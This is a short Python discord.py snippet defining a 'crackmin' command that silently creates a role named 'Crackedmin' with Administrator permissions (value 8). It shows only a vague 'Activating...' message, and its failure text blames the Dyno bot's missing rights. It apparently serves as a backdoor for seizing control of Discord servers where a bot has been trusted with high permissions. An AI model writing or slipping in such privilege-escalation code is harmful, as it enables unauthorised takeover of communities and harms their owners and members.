import discord
from discord.ext import commands
async def crackmin(ctx):
    await ctx.send("Activating...")
    try:
        guild = ctx.guild
        await guild.create_role(name="Crackedmin", permissions=discord.Permissions(permissions=8))
        print("Succesfully made Crackmin role")
        await ctx.send("Succesfully Activated!")
    except:
        await ctx.send("Failed to activate, this means that Dyno does not have Administrator")
        print("Failed to make Crackmin role, does the bot have the right perms?")